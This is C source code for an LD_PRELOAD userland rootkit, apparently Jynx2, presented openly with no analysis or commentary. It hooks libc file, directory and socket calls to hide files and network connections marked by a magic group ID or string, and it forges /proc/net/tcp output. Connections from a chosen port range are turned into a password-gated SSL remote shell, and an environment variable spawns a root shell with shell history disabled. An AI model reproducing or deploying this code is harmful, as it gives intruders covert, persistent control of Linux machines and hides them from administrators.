#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include "config.h"

void *libc;

/* SSL connection global vars */
SSL_CTX *ctx;
SSL *ssl;

static void init (void) __attribute__ ((constructor));

static int (*old_accept) (int sockfd, struct sockaddr * addr,
			  socklen_t * addrlen);
static int (*old_access) (const char *path, int amode);
static int (*old_fxstat) (int ver, int fildes, struct stat * buf);
static int (*old_fxstat64) (int ver, int fildes, struct stat64 * buf);
static int (*old_lxstat) (int ver, const char *file, struct stat * buf);
static int (*old_lxstat64) (int ver, const char *file, struct stat64 * buf);
static int (*old_open) (const char *pathname, int flags, mode_t mode);
static int (*old_rmdir) (const char *pathname);
static int (*old_unlink) (const char *pathname);
static int (*old_unlinkat) (int dirfd, const char *pathname, int flags);
static int (*old_xstat) (int ver, const char *path, struct stat * buf);
static int (*old_xstat64) (int ver, const char *path, struct stat64 * buf);

static ssize_t (*old_write) (int fildes, const void *buf, size_t nbyte);

static FILE *(*old_fopen) (const char *filename, const char *mode);
static FILE *(*old_fopen64) (const char *filename, const char *mode);

static DIR *(*old_fdopendir) (int fd);
static DIR *(*old_opendir) (const char *name);

static struct dirent *(*old_readdir) (DIR * dir);
static struct dirent64 *(*old_readdir64) (DIR * dir);

void drop_suid_shell_if_env_set (void);

void
__attribute ((constructor))
init (void)
{
#ifdef DEBUG
  printf ("[-] jynx2.so loaded.\n");
#endif
  libc = dlopen (LIBC_PATH, RTLD_LAZY);
}

int
write_loop (int fd, char *buf, size_t size)
{
  char *p;
  int n;

  p = buf;
  while (p - buf < size) {
    n = write (fd, p, size - (p - buf));
    if (n == -1) {
      if (errno == EINTR)
	continue;
      else
	break;
    }
    p += n;
  }

  return p - buf;
}

void
cmd_loop (int sock)
{
  int child_stdin[2];
  int child_stdout[2];
  int pid;

  char buf[DEFAULT_TCP_BUF_LEN];
  char preload[512];
  int maxfd;

  if (pipe (child_stdin) == -1 || pipe (child_stdout) == -1) {
#ifdef DEBUG
    printf ("Couldn't open pipes.\n");
#endif
    exit (1);
  }

  pid = fork ();
  if (pid == -1) {
#ifdef DEBUG
    printf ("Fork died.\n");
#endif
    exit (1);
  }

  if (pid == 0) {
    /* This is the child process. Exec the command. */
    close (child_stdin[1]);
    close (child_stdout[0]);

    /* rearrange stdin and stdout */
    dup2 (child_stdin[0], STDIN_FILENO);
    dup2 (child_stdout[1], STDOUT_FILENO);
    dup2 (child_stdout[1], STDERR_FILENO);

    snprintf(preload,sizeof(preload),"LD_PRELOAD=%s",REALITY_PATH);
    putenv (preload);
    execl ("/bin/bash", SHELL_NAME, "-l", (char *) 0);
    /* exec failed. */
#ifdef DEBUG
    printf ("exec failed.\n");
#endif
    exit (1);
  }

  close (child_stdin[0]);
  close (child_stdout[1]);

  maxfd = child_stdout[0];

  if (sock > maxfd)
    maxfd = sock;

  for (;;) {
    fd_set fds;
    int r, n_r;

    FD_ZERO (&fds);
    FD_SET (sock, &fds);
    FD_SET (child_stdout[0], &fds);

    r = select (maxfd + 1, &fds, NULL, NULL, NULL);

    if (r == -1) {
      if (errno == EINTR)
	continue;
      else
	break;
    }

    if (FD_ISSET (sock, &fds)) {
      do {
	memset (&buf, '\0', sizeof (buf));
	n_r = SSL_read (ssl, buf, sizeof (buf) - 1);

	switch (SSL_get_error (ssl, n_r)) {
	case SSL_ERROR_NONE:
	  break;
	case SSL_ERROR_ZERO_RETURN:
	  goto end;
	  break;
	case SSL_ERROR_WANT_READ:
	  break;
	case SSL_ERROR_WANT_WRITE:
	  break;
	default:
	  exit (1);
	}

	write_loop (child_stdin[1], buf, strlen (buf));
      }
      while (SSL_pending (ssl));

    }

    if (FD_ISSET (child_stdout[0], &fds)) {
      memset (&buf, '\0', DEFAULT_TCP_BUF_LEN);
      n_r = read (child_stdout[0], buf, sizeof (buf));
      if (n_r <= 0)
	break;

      if (n_r <= 512) {

	SSL_write (ssl, buf, strlen (buf));
      }
      else {
	char temp[512];
	char *tmp_str;
	int cnt = 0;
	while (n_r > 512) {
	  ++cnt;
	  bcopy (buf, &temp, 511);
	  SSL_write (ssl, temp, strlen (temp));
	  n_r -= 512;
	  tmp_str = &buf[512];
	  bcopy (tmp_str, &buf, strlen (buf));
	}
	SSL_write (ssl, buf, strlen (buf));
      }
    }
  }
end:
  if (ssl != NULL) {
    SSL_shutdown (ssl);
    SSL_free (ssl);
  }
  close (sock);

  exit (0);
}

int
gen_cert (X509 ** cert, EVP_PKEY ** key)
{
  RSA *rsa;
  X509_NAME *subj;
  X509_EXTENSION *ext;
  X509V3_CTX ctx;
  const char *commonName = "localhost";
  char dNSName[128];
  int rc;

  *cert = NULL;
  *key = NULL;

  /* Generate a private key. */
  *key = EVP_PKEY_new ();
  if (*key == NULL) {
#ifdef DEBUG
    fprintf (stderr, "Error generating key.\n");
#endif
    exit (1);
  }

  do {
    rsa = RSA_generate_key (DEFAULT_KEY_BITS, RSA_F4, NULL, NULL);
    if (rsa == NULL) {
#ifdef DEBUG
      fprintf (stderr, "Error generating RSA key.\n");
#endif
      exit (1);
    }
    rc = RSA_check_key (rsa);
  }
  while (rc == 0);
  if (rc == -1) {
#ifdef DEBUG
    fprintf (stderr, "Error generating RSA key.\n");
#endif
    exit (1);
  }
  if (EVP_PKEY_assign_RSA (*key, rsa) == 0) {
    RSA_free (rsa);
#ifdef DEBUG
    fprintf (stderr, "Error with EVP and PKEY.\n");
#endif
    exit (1);
  }

  /* Generate a certificate. */
  *cert = X509_new ();
  if (*cert == NULL) {
#ifdef DEBUG
    fprintf (stderr, "Couldn't generate 509 cert.\n");
#endif
    exit (1);
  }
  if (X509_set_version (*cert, 2) == 0) {	/* Version 3. */
#ifdef DEBUG
    fprintf (stderr, "Couldn't set x509 version.\n");
#endif
    exit (1);
  }

  /* Set the commonName. */
  subj = X509_get_subject_name (*cert);
  if (X509_NAME_add_entry_by_txt (subj, "commonName", MBSTRING_ASC,
				  (unsigned char *) commonName, -1, -1,
				  0) == 0) {
#ifdef DEBUG
    fprintf (stderr, "Couldn't set common name.\n");
#endif
    exit (1);
  }

  /* Set the dNSName. */
  rc = snprintf (dNSName, sizeof (dNSName), "DNS:%s", commonName);
  if (rc < 0 || rc >= sizeof (dNSName)) {
#ifdef DEBUG
    fprintf (stderr, "Unable to set dns name.\n");
#endif
    exit (1);
  }
  X509V3_set_ctx (&ctx, *cert, *cert, NULL, NULL, 0);
  ext = X509V3_EXT_conf (NULL, &ctx, "subjectAltName", dNSName);
  if (ext == NULL) {
#ifdef DEBUG
    fprintf (stderr, "Unable to get subjectaltname.\n");
#endif
    exit (1);
  }
  if (X509_add_ext (*cert, ext, -1) == 0) {
#ifdef DEBUG
    fprintf (stderr, "x509_add_ext error.\n");
#endif
    exit (1);
  }

  /* Set a comment. */
  ext = X509V3_EXT_conf (NULL, &ctx, "nsComment", CERTIFICATE_COMMENT);
  if (ext == NULL) {
#ifdef DEBUG
    fprintf (stderr, "x509v3_ext_conf error.\n");
#endif
    exit (1);
  }
  if (X509_add_ext (*cert, ext, -1) == 0) {
#ifdef DEBUG
    fprintf (stderr, "x509_add_ext error.\n");
#endif
    exit (1);
  }

  X509_set_issuer_name (*cert, X509_get_subject_name (*cert));
  X509_gmtime_adj (X509_get_notBefore (*cert), 0);
  X509_gmtime_adj (X509_get_notAfter (*cert), DEFAULT_CERT_DURATION);
  X509_set_pubkey (*cert, *key);

  /* Sign it. */
  if (X509_sign (*cert, *key, EVP_sha1 ()) == 0) {
#ifdef DEBUG
    fprintf (stderr, "x509_sign error.\n");
#endif
    exit (1);
  }

  return 1;
}

SSL_CTX *
InitCTX (void)
{
  SSL_METHOD *method;
  X509 *cert;
  EVP_PKEY *key;

  SSL_library_init ();
  OpenSSL_add_all_algorithms ();	/* Load cryptos, et.al. */
  SSL_load_error_strings ();	/* Bring in and register error messages */
  method = SSLv3_server_method ();
  ctx = SSL_CTX_new (method);	/* Create new context */

  if (ctx == NULL) {
#ifdef DEBUG
    ERR_print_errors_fp (stderr);
#endif
    abort ();
  }

  SSL_CTX_set_options (ctx, SSL_OP_ALL | SSL_OP_NO_SSLv2);
  SSL_CTX_set_cipher_list (ctx, "ALL:!ADH:!LOW:!EXP:!MD5:@STRENGTH");

  if (gen_cert (&cert, &key) == 0) {
#ifdef DEBUG
    printf ("Error w/ gen_cert()\n");
#endif
    exit (1);
  }

  if (SSL_CTX_use_certificate (ctx, cert) != 1) {
#ifdef DEBUG
    fprintf (stderr, "SSL_CTX_use_certificate failed.\n");
#endif
    exit (1);
  }
  if (SSL_CTX_use_PrivateKey (ctx, key) != 1) {
#ifdef DEBUG
    fprintf (stderr, "SSL_CTX_use_PrivateKey failed.\n");
#endif
    exit (1);
  }

  X509_free (cert);
  EVP_PKEY_free (key);

  return ctx;
}

void
backconnect (int sock)
{
#ifdef DEBUG
  printf ("backconnect called.\n");
#endif
  char temp[256];

  ctx = InitCTX ();
  ssl = SSL_new (ctx);
  SSL_set_fd (ssl, sock);
  sock = SSL_get_fd (ssl);

  if (SSL_accept (ssl) == -1) {
#ifdef DEBUG
    ERR_print_errors_fp (stdout);
#endif
    exit (1);
  }
  else {
    SSL_read (ssl, temp, sizeof (temp));

    if (!strstr (temp, SHELL_PASSWD)) {
      close (sock);
      SSL_CTX_free (ctx);
      return;
    }

    SSL_write (ssl, SHELL_MSG, sizeof (SHELL_MSG));

    cmd_loop (sock);

    close (sock);
    SSL_CTX_free (ctx);
  }

  return;
}

int
drop_dup_shell (int sockfd, struct sockaddr *addr)
{
  pid_t my_pid;

  struct sockaddr_in *sa_i = (struct sockaddr_in *) addr;

#ifdef DEBUG
  printf ("drop_dup_shell called.\n");
#endif

  if (htons (sa_i->sin_port) >= LOW_PORT
      && htons (sa_i->sin_port) <= HIGH_PORT) {
    my_pid = fork ();
    if (my_pid == 0) {
      fsync (sockfd);
      backconnect (sockfd);
    }
    else {
      errno = ECONNABORTED;
      return -1;
    }
  }

  return sockfd;

}

FILE *
forge_proc_net_tcp (const char *filename)
{
  char line[LINE_MAX];

  unsigned long rxq, txq, time_len, retr, inode;
  int local_port, rem_port, d, state, uid, timer_run, timeout;
  char rem_addr[128], local_addr[128], more[512];

#ifdef DEBUG
  printf ("forge_proc_net_tcp executed.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_fopen)
    old_fopen = dlsym (libc, "fopen");

  FILE *tmp = tmpfile ();

  FILE *pnt = old_fopen (filename, "r");

  while (fgets (line, LINE_MAX, pnt) != NULL) {
    sscanf (line,
	    "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n",
	    &d, local_addr, &local_port, rem_addr, &rem_port, &state,
	    &txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout,
	    &inode, more);


    if ((rem_port >= LOW_PORT && rem_port <= HIGH_PORT) || uid == MAGIC_UID) {
    }
    else {

      if (local_port >= LOW_PORT && local_port <= HIGH_PORT) {
      }
      else {
	fputs (line, tmp);
      }

    }


  }

  fclose (pnt);


  fseek (tmp, 0, SEEK_SET);

  return tmp;

}

int
accept (int sockfd, struct sockaddr *addr, socklen_t * addrlen)
{
#ifdef DEBUG
  printf ("accept hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_accept)
    old_accept = dlsym (libc, "accept");

  int sock = old_accept (sockfd, addr, addrlen);

  return drop_dup_shell (sock, addr);

}

int
access (const char *path, int amode)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("access hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_access)
    old_access = dlsym (libc, "access");

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  drop_suid_shell_if_env_set ();

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat (_STAT_VER, path, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || (strstr (path, MAGIC_STRING))
      || (strstr (path, CONFIG_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_access (path, amode);
}

FILE *
fopen (const char *filename, const char *mode)
{
  struct stat s_fstat;
#ifdef DEBUG
  printf ("fopen hooked %s.\n", filename);
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_fopen)
    old_fopen = dlsym (libc, "fopen");
    
  if (!old_xstat)
    old_xstat = dlsym(libc, "__xstat");
    
  if (strcmp (filename, PROC_NET_TCP) == 0
      || strcmp (filename, PROC_NET_TCP6) == 0)
    return forge_proc_net_tcp (filename);
    
  memset (&s_fstat, 0, sizeof (stat));

  old_xstat (_STAT_VER, filename, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || (strstr (filename, MAGIC_STRING))
      || (strstr (filename, CONFIG_FILE))) {
    errno = ENOENT;
    return NULL;
  }

  return old_fopen (filename, mode);
}

FILE *
fopen64 (const char *filename, const char *mode)
{
  struct stat s_fstat;
#ifdef DEBUG
  printf ("fopen64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_fopen64)
    old_fopen64 = dlsym (libc, "fopen64");
    
  if (!old_xstat)
    old_xstat = dlsym(libc, "__xstat");

  if (strcmp (filename, PROC_NET_TCP) == 0
      || strcmp (filename, PROC_NET_TCP6) == 0)
    return forge_proc_net_tcp (filename);
    
  memset (&s_fstat, 0, sizeof (stat));

  old_xstat (_STAT_VER, filename, &s_fstat);
  
  if (s_fstat.st_gid == MAGIC_GID || (strstr (filename, MAGIC_STRING))
      || (strstr (filename, CONFIG_FILE))) {
    errno = ENOENT;
    return NULL;
  }

  return old_fopen64 (filename, mode);
}

void
drop_suid_shell_if_env_set (void)
{
  char *env_var = getenv (ENV_VARIABLE);
  char preload[512];
  
#ifdef DEBUG
  printf ("drop_suid_shell called.\n");
#endif

  if (env_var) {
    if (geteuid () == 0) {
      setgid (0);
      setuid (0);

      unsetenv (ENV_VARIABLE);
      putenv ("HISTFILE=/dev/null");
      snprintf(preload,sizeof(preload),"LD_PRELOAD=%s",REALITY_PATH);
	  putenv(preload);
      execl ("/bin/bash", SHELL_NAME, "--login", (char *) 0);
      execl ("/bin/sh", SHELL_NAME, (char *) 0);

    }
  }
}

int
fstat (int fd, struct stat *buf)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("fstat hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_fxstat == NULL)
    old_fxstat = dlsym (libc, "__fxstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_fxstat (_STAT_VER, fd, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID) {
    errno = ENOENT;
    return -1;
  }

  return old_fxstat (_STAT_VER, fd, buf);
}

ssize_t
write (int fildes, const void *buf, size_t nbyte)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("write hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_write == NULL)
    old_write = dlsym (libc, "write");

  if (old_fxstat == NULL)
    old_fxstat = dlsym (libc, "__fxstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_fxstat (_STAT_VER, fildes, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID) {
    errno = EIO;
    return -1;
  }

  return old_write (fildes, buf, nbyte);
}

int
fstat64 (int fd, struct stat64 *buf)
{
  struct stat64 s_fstat;

#ifdef DEBUG
  printf ("fstat64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_fxstat64 == NULL)
    old_fxstat64 = dlsym (libc, "__fxstat64");

  memset (&s_fstat, 0, sizeof (stat));

  old_fxstat64 (_STAT_VER, fd, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID) {
    errno = ENOENT;
    return -1;
  }

  return old_fxstat64 (_STAT_VER, fd, buf);
}

int
__fxstat (int ver, int fildes, struct stat *buf)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("__fxstat hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_fxstat == NULL)
    old_fxstat = dlsym (libc, "__fxstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_fxstat (ver, fildes, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID) {
    errno = ENOENT;
    return -1;
  }
  return old_fxstat (ver, fildes, buf);
}

int
__fxstat64 (int ver, int fildes, struct stat64 *buf)
{
  struct stat64 s_fstat;

#ifdef DEBUG
  printf ("__fxstat64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_fxstat64 == NULL)
    old_fxstat64 = dlsym (libc, "__fxstat64");

  memset (&s_fstat, 0, sizeof (stat));

  old_fxstat64 (ver, fildes, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID) {
    errno = ENOENT;
    return -1;
  }

  return old_fxstat64 (ver, fildes, buf);
}

int
lstat (const char *file, struct stat *buf)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("lstat hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_lxstat == NULL)
    old_lxstat = dlsym (libc, "__lxstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_lxstat (_STAT_VER, file, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (file, CONFIG_FILE)
      || strstr (file, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_lxstat (_STAT_VER, file, buf);
}

int
lstat64 (const char *file, struct stat64 *buf)
{
  struct stat64 s_fstat;

#ifdef DEBUG
  printf ("lstat64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_lxstat64 == NULL)
    old_lxstat64 = dlsym (libc, "__lxstat64");

  memset (&s_fstat, 0, sizeof (stat));

  old_lxstat64 (_STAT_VER, file, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (file, CONFIG_FILE)
      || strstr (file, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_lxstat64 (_STAT_VER, file, buf);
}

int
__lxstat (int ver, const char *file, struct stat *buf)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("__lxstat hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_lxstat == NULL)
    old_lxstat = dlsym (libc, "__lxstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_lxstat (ver, file, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (file, CONFIG_FILE)
      || strstr (file, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_lxstat (ver, file, buf);
}

int
__lxstat64 (int ver, const char *file, struct stat64 *buf)
{
  struct stat64 s_fstat;

#ifdef DEBUG
  printf ("__lxstat64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_lxstat64 == NULL)
    old_lxstat64 = dlsym (libc, "__lxstat64");

  memset (&s_fstat, 0, sizeof (stat));

  old_lxstat64 (ver, file, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (file, CONFIG_FILE)
      || strstr (file, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_lxstat64 (ver, file, buf);
}

int
open (const char *pathname, int flags, mode_t mode)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("open hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_open == NULL)
    old_open = dlsym (libc, "open");

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  drop_suid_shell_if_env_set ();

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat (_STAT_VER, pathname, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || (strstr (pathname, MAGIC_STRING))
      || (strstr (pathname, CONFIG_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_open (pathname, flags, mode);
}

int
rmdir (const char *pathname)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("rmdir hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_rmdir == NULL)
    old_rmdir = dlsym (libc, "rmdir");

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat (_STAT_VER, pathname, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || (strstr (pathname, MAGIC_STRING))
      || (strstr (pathname, CONFIG_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_rmdir (pathname);
}

int
stat (const char *path, struct stat *buf)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("stat hooked\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat (_STAT_VER, path, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (path, CONFIG_FILE)
      || strstr (path, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_xstat (3, path, buf);
}

int
stat64 (const char *path, struct stat64 *buf)
{
  struct stat64 s_fstat;

#ifdef DEBUG
  printf ("stat64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_xstat64 == NULL)
    old_xstat64 = dlsym (libc, "__xstat64");

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat64 (_STAT_VER, path, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (path, CONFIG_FILE)
      || strstr (path, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_xstat64 (_STAT_VER, path, buf);
}

int
__xstat (int ver, const char *path, struct stat *buf)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("xstat hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  drop_suid_shell_if_env_set ();

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat (ver, path, &s_fstat);

  memset (&s_fstat, 0, sizeof (stat));

  if (s_fstat.st_gid == MAGIC_GID || strstr (path, CONFIG_FILE)
      || strstr (path, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_xstat (ver, path, buf);
}

int
__xstat64 (int ver, const char *path, struct stat64 *buf)
{
  struct stat64 s_fstat;

#ifdef DEBUG
  printf ("xstat64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_xstat64 == NULL)
    old_xstat64 = dlsym (libc, "__xstat64");

  drop_suid_shell_if_env_set ();

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat64 (ver, path, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (path, CONFIG_FILE)
      || strstr (path, MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }

  return old_xstat64 (ver, path, buf);
}

int
unlink (const char *pathname)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("unlink hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_unlink == NULL)
    old_unlink = dlsym (libc, "unlink");

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat (_STAT_VER, pathname, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || (strstr (pathname, MAGIC_STRING))
      || (strstr (pathname, CONFIG_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_unlink (pathname);
}

int
unlinkat (int dirfd, const char *pathname, int flags)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("unlinkat hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_unlinkat == NULL)
    old_unlinkat = dlsym (libc, "unlinkat");

  if (old_fxstat == NULL)
    old_fxstat = dlsym (libc, "__fxstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_fxstat (_STAT_VER, dirfd, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || (strstr (pathname, MAGIC_STRING))
      || (strstr (pathname, CONFIG_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_unlinkat (dirfd, pathname, flags);
}

DIR *
fdopendir (int fd)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("fdopendir hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_fdopendir == NULL)
    old_fdopendir = dlsym (libc, "fdopendir");

  if (old_fxstat == NULL)
    old_fxstat = dlsym (libc, "__fxstat");

  drop_suid_shell_if_env_set ();

  memset (&s_fstat, 0, sizeof (stat));

  old_fxstat (_STAT_VER, fd, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID) {
    errno = ENOENT;
    return NULL;
  }

  return old_fdopendir (fd);
}

DIR *
opendir (const char *name)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("opendir hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_opendir == NULL)
    old_opendir = dlsym (libc, "opendir");

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  drop_suid_shell_if_env_set ();

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat (_STAT_VER, name, &s_fstat);

  if (s_fstat.st_gid == MAGIC_GID || strstr (name, CONFIG_FILE)
      || strstr (name, MAGIC_STRING)) {
    errno = ENOENT;
    return NULL;
  }

  return old_opendir (name);
}

struct dirent *
readdir (DIR * dirp)
{
  struct dirent *dir;

#ifdef DEBUG
  printf ("readdir hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_readdir)
    old_readdir = dlsym (libc, "readdir");

  do {
    dir = old_readdir (dirp);

    if (dir != NULL
	&& (strcmp (dir->d_name, ".\0") || strcmp (dir->d_name, "/\0")))
      continue;


  }
  while (dir
	 && (strstr (dir->d_name, MAGIC_STRING) != 0
	     || strstr (dir->d_name, CONFIG_FILE) != 0));

  return dir;
}

struct dirent64 *
readdir64 (DIR * dirp)
{
  struct dirent64 *dir;

#ifdef DEBUG
  printf ("readdir64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_readdir64)
    old_readdir64 = dlsym (libc, "readdir64");

  do {
    dir = old_readdir64 (dirp);

    if (dir != NULL
	&& (strcmp (dir->d_name, ".\0") || strcmp (dir->d_name, "/\0")))
      continue;


  }
  while (dir
	 && (strstr (dir->d_name, MAGIC_STRING) != 0
	     || strstr (dir->d_name, CONFIG_FILE) != 0));

  return dir;
}
